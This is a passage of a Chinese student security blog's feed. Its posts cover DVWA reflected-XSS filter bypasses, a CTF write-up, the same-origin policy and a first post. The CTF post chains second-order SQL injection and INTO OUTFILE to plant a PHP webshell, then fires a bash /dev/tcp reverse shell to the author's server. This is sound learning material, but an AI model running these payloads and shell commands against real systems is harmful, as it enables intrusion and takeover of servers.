    <content type="html"><![CDATA[<h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h1><p>用phpstudy搭了一个渗透测试环境，从xss开始吧，难度从低到高的源码<br><img src="/2018/12/01/xss跨站脚本攻击-1/捕获.PNG" alt=" "><br><a id="more"></a><br>low难度没有任何过滤直接 <script>alert(‘xss’)</script>就可以得到弹窗，medium难度加了str_replace，high难度加了preg_replace，这两个函数有什么区别呢？搜索一波，</p><h3 id="str-replace（）："><a href="#str-replace（）：" class="headerlink" title="str_replace（）："></a>str_replace（）：</h3><p>定义和用法</p><p>str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。</p><p>该函数必须遵循下列规则：</p><p>如果搜索的字符串是数组，那么它将返回数组。<br>如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换。<br>如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换<br>如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用。<br>注释：该函数区分大小写。请使用 str_ireplace() 函数执行不区分大小写的搜索。<br><img src="/2018/12/01/xss跨站脚本攻击-1/1.PNG" alt=" "></p><h5 id="1-大小写绕过-lt-sCript-gt"><a href="#1-大小写绕过-lt-sCript-gt" class="headerlink" title="(1)大小写绕过&lt; sCript&gt;"></a>(1)大小写绕过&lt; sCript&gt;</h5><h5 id="2-双写绕过-lt-scr-lt-script-gt-ipt-gt"><a href="#2-双写绕过-lt-scr-lt-script-gt-ipt-gt" class="headerlink" title="(2)双写绕过&lt; scr&lt; script&gt;ipt&gt;"></a>(2)双写绕过&lt; scr&lt; script&gt;ipt&gt;</h5><p>（原文：<a href="https://blog.csdn.net/caoyouming0609/article/details/75208002）" target="_blank" rel="noopener">https://blog.csdn.net/caoyouming0609/article/details/75208002）</a>  </p><h3 id="preg-replace（）："><a href="#preg-replace（）：" class="headerlink" title="preg_replace（）："></a>preg_replace（）：</h3><p>.： 匹配除“\n”之外的任何单个字符。<br>*： 匹配前面的子表达式零次或多次。<br>所以&lt; script&gt;标签不可用，&lt; img src=”javascript:alert(‘xss’);”&gt;也不可用，我们无法依靠属性值进行跨站，但可以产生自己的事件<br>&lt; img src=”1” onerror=alert(‘xss’)&gt;</p><p>onerror是IMG标记的一个事件，只要页面发生错误，该事件立即被激活，语句中浏览器解释IMG标记时，会加载src属性引用的图片地址，该图片不存在则触发onerror事件。</p><h3 id="盗取cookie"><a href="#盗取cookie" class="headerlink" title="盗取cookie"></a>盗取cookie</h3><p>(咕~)</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;XSS-Reflected&quot;&gt;&lt;a href=&quot;#XSS-Reflected&quot; class=&quot;headerlink&quot; title=&quot;XSS (Reflected)&quot;&gt;&lt;/a&gt;XSS (Reflected)&lt;/h1&gt;&lt;p&gt;用phpstudy搭了一个渗透测试环境，从xss开始吧，难度从低到高的源码&lt;br&gt;&lt;img src=&quot;/2018/12/01/xss跨站脚本攻击-1/捕获.PNG&quot; alt=&quot; &quot;&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>黑白盒</title>
    <link href="http://yoursite.com/2018/11/29/%E9%BB%91%E7%99%BD%E7%9B%92/"/>
    <id>http://yoursite.com/2018/11/29/黑白盒/</id>
    <published>2018-11-29T01:12:31.245Z</published>
    <updated>2018-11-29T01:24:24.324Z</updated>
    
    <content type="html"><![CDATA[<h1 id="黑白盒复现-补招新题"><a href="#黑白盒复现-补招新题" class="headerlink" title="黑白盒复现(补招新题)"></a>黑白盒复现(补招新题)</h1><p>招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。  </p><p>首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。</p><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；</p><p>2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);</p><p>3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。</p><p>4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。<br><a id="more"></a><br>在大多数情况下，文件上传漏洞一般都是指“上传的Web脚本被服务器解析从而获取网站shell权限”，也就是webshell，要完成上传漏洞攻击需要满足以下几个条件:</p><p>1、上传的文件能够被Web容器解释执行，所以文件上传后所在的目录需要解析器可以执行目录下的文件，也就是说文件目录必须在web容器覆盖路径内才行。</p><p>2、用户可以直接通过浏览器进行访问这个shell文件，如果web容器不能解析这个文件，那么也不能算是漏洞。</p><p>3、最后，上传的shell文件如果被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。<br>(来源：看雪)</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>在图片上传上我们看到上传图片的地址已知，访问地址可以看到我们上传上去的图片，所以我们可以利用SQL写入一句话getshell，再反弹shell从服务器中拿到flag。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>网站对我们输入的一些关键字符进行了转义，但在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了该数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。  </p><p>在注册用户名时我们发现当我们的用户名为 1’ 时 登陆后显示的是 1\’ 所以网页对’进行了转义，但当我们在查看用户信息时我们的user_name<br>显示为 1’ 所以说明我们的用户名已经被存储在数据库之中，并且从数据库中提取出来不会存在转义，这就造成了一个二次注入。</p><h4 id="Into-outfile"><a href="#Into-outfile" class="headerlink" title="Into outfile"></a>Into outfile</h4><p>导出数据到pc的指定目录下。<br>在一开始的图片文件上传的时候我们看到存在/var/www/html/favicon/xxx可以读取和查看文件，所以我们将一句话写入这个地方<br>/var/www/html/一般为网站的根目录</p><h4 id="注册-lt-php-GET-x-gt"><a href="#注册-lt-php-GET-x-gt" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;</h4><p>&lt;?php <code>$_GET[x]</code>;?&gt; PHP中反引号 <code></code> 的作用是把反引号中的内容当做Shell命令执行，我们可以在新创建的的网页上传入变量x值来执行我们想要目标主机执行的命令，注册该用户可以将&lt;?php <code>$_GET[x]</code>;?&gt;写入数据库</p><h4 id="注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php"><a href="#注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;’into outfile’/var/www/html/favicon/4.php"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;’into outfile’/var/www/html/favicon/4.php</h4><p>将&lt;?php <code>$_GET[x]</code>;?&gt;从数据库中提取出来并导出到favicon/4.php<br>此时在4.php中我们就可以通过变量x来上传我们想让目标主机执行的shell命令了</p><h4 id="bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”"><a href="#bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”" class="headerlink" title="bash -c “bash -i &gt;&amp; /dev/tcp//9999 0&lt;&amp;1 2&gt;&amp;1”"></a>bash -c “bash -i &gt;&amp; /dev/tcp/<your-server-ip>/9999 0&lt;&amp;1 2&gt;&amp;1”</your-server-ip></h4><p>首先，bash -c 就是运行shell脚本 bash -i是打开一个交互的bash，/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。<br>要想了解“&gt;&amp;”、“0&gt;&amp;1”和2&gt;&amp;1，首先我们要先了解一下Linux文件描述符和重定向。</p><p>linux shell下常用的文件描述符是：</p><ol><li><p>标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p></li><li><p>标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p></li></ol><p>&amp;可以理解为c语言中的取地址符（n&lt;&amp;word 是把word复制给n，n&gt;&amp;word是把word复制给n。）2&gt;&amp;1是将标准错误输出合并到标准输出中，&amp;&gt;是将标准错误输出定向到标准输出中。也就是输出标准输出的同时也会输出标准错误输出。这句话的意思创建一个可交互的bash和一个到xxx.xxx.xxx.xxx的TCP链接，然后将bash的输入输出错误都重定向到在xxx.xxx.xxx.xxx监听的进程。简单来说就是A主机可以通过执行B主机上的命令并且把返回值都返回到A上。</p><h5 id="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…"><a href="#这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…" class="headerlink" title="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)"></a>这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)</h5><p>之后再服务器开启监听 nc -lvnp 9999  </p><p>现在我们之前所传的一句话就派上了用场，在4.php的地址后构造?x=bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp/<your-server-ip>/9999 0%3C%26%202%3E%261%22 就可以让目标主机执行这个命令  </your-server-ip></p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>A主机开启9999端口的tcp服务<br>B主机连接到A主机的9999的tcp服务<br>A主机通过tcp服务把命令发到B主机<br>B主机读取命令并且在bash中执行<br>B主机把执行结果发给A主机</p><p>拿到shell之后就可以 cd / 进入主目录，主目录中存在包含flag的文件<br><img src="/2018/11/29/黑白盒/1.png" alt=" "><br>cat读取文件就可以拿到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;黑白盒复现-补招新题&quot;&gt;&lt;a href=&quot;#黑白盒复现-补招新题&quot; class=&quot;headerlink&quot; title=&quot;黑白盒复现(补招新题)&quot;&gt;&lt;/a&gt;黑白盒复现(补招新题)&lt;/h1&gt;&lt;p&gt;招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。  &lt;/p&gt;
&lt;p&gt;首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。&lt;/p&gt;
&lt;h3 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h3&gt;&lt;h4 id=&quot;分类&quot;&gt;&lt;a href=&quot;#分类&quot; class=&quot;headerlink&quot; title=&quot;分类&quot;&gt;&lt;/a&gt;分类&lt;/h4&gt;&lt;p&gt;1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；&lt;/p&gt;
&lt;p&gt;2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);&lt;/p&gt;
&lt;p&gt;3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。&lt;/p&gt;
&lt;p&gt;4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web复现" scheme="http://yoursite.com/categories/Web%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>同源策略</title>
    <link href="http://yoursite.com/2018/11/19/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <id>http://yoursite.com/2018/11/19/同源策略/</id>
    <published>2018-11-19T09:16:54.661Z</published>
    <updated>2018-11-19T09:56:32.033Z</updated>
    
    <content type="html"><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略</p><h2 id="首先是源的概念："><a href="#首先是源的概念：" class="headerlink" title="首先是源的概念："></a>首先是源的概念：</h2><p>•    源（origin）就是协议、域名和端口号。 以下是相对于 <a href="http://www.a.com/test/index.html" target="_blank" rel="noopener">http://www.a.com/test/index.html</a> 的同源检测<br>•    <a href="http://www.a.com/dir/page.html" target="_blank" rel="noopener">http://www.a.com/dir/page.html</a> —-成功<br>•    <a href="http://www.child.a.com/test/index.html" target="_blank" rel="noopener">http://www.child.a.com/test/index.html</a> —-失败，域名不同<br>•    <a href="https://www.a.com/test/index.html" target="_blank" rel="noopener">https://www.a.com/test/index.html</a> —-失败，协议不同<br>所以所谓同源就是协议、域名和端口号均相同。</p><h2 id="什么是同源策略："><a href="#什么是同源策略：" class="headerlink" title="什么是同源策略："></a>什么是同源策略：</h2><a id="more"></a><p>同源策略是一种约定，限制了来自不同源的“document”或脚本，对当前“doucument”的读取或者设置某些属性。</p><h6 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a>举个例子：</h6><p>如果没有同源策略，可能a.com里的一段JS脚本在b.com未加载此脚本时也可以修改b.com的内容。 同源策略限制了不同源的对象之间的互相干扰，也就是说当JS被浏览器认为来自不同源时，请求被拒绝。注意，对于当前页面来说，页面里存放JS文件的域不重要，重要的是加载JS界面的域是什么。</p><h2 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域"></a>什么是跨域</h2><p>浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都是跨域</p><h6 id="不受同源策略限制的："><a href="#不受同源策略限制的：" class="headerlink" title="不受同源策略限制的："></a>不受同源策略限制的：</h6><p>1、页面中的链接，重定向以及表单提交是不会受到同源策略限制的。<br> 2、跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的 &lt; script src=”…” &gt; &lt; /script &gt;，&lt; img &gt;，&lt; link &gt;，&lt; iframe &gt;等。 所以我们就可以利用&lt; script &gt;标签来绕过了同源策略，来找到跨域漏洞。</p><p>第一次写博客，内容不是很全，也会有许多错误的地方，了解的知识很有限，一些名词和漏洞名称从来没有接触过，希望大家可以指出错误。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerlink&quot; title=&quot;同源策略&quot;&gt;&lt;/a&gt;同源策略&lt;/h1&gt;&lt;p&gt;最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略&lt;/p&gt;
&lt;h2 id=&quot;首先是源的概念：&quot;&gt;&lt;a href=&quot;#首先是源的概念：&quot; class=&quot;headerlink&quot; title=&quot;首先是源的概念：&quot;&gt;&lt;/a&gt;首先是源的概念：&lt;/h2&gt;&lt;p&gt;•    源（origin）就是协议、域名和端口号。 以下是相对于 &lt;a href=&quot;http://www.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.a.com/test/index.html&lt;/a&gt; 的同源检测&lt;br&gt;•    &lt;a href=&quot;http://www.a.com/dir/page.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.a.com/dir/page.html&lt;/a&gt; —-成功&lt;br&gt;•    &lt;a href=&quot;http://www.child.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.child.a.com/test/index.html&lt;/a&gt; —-失败，域名不同&lt;br&gt;•    &lt;a href=&quot;https://www.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.a.com/test/index.html&lt;/a&gt; —-失败，协议不同&lt;br&gt;所以所谓同源就是协议、域名和端口号均相同。&lt;/p&gt;
&lt;h2 id=&quot;什么是同源策略：&quot;&gt;&lt;a href=&quot;#什么是同源策略：&quot; class=&quot;headerlink&quot; title=&quot;什么是同源策略：&quot;&gt;&lt;/a&gt;什么是同源策略：&lt;/h2&gt;
    
    </summary>
    
      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>博客初建</title>
    <link href="http://yoursite.com/2018/11/17/%E9%BB%91%E7%99%BD%E7%9B%92/hello-world/"/>
    <id>http://yoursite.com/2018/11/17/黑白盒/hello-world/</id>
    <published>2018-11-17T09:07:52.974Z</published>
    <updated>2018-11-17T13:39:28.936Z</updated>
    
    <content type="html"><![CDATA[<p><center>从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。<center></center></center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;center&gt;从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。&lt;center&gt;&lt;/center&gt;&lt;/center&gt;&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
</feed>
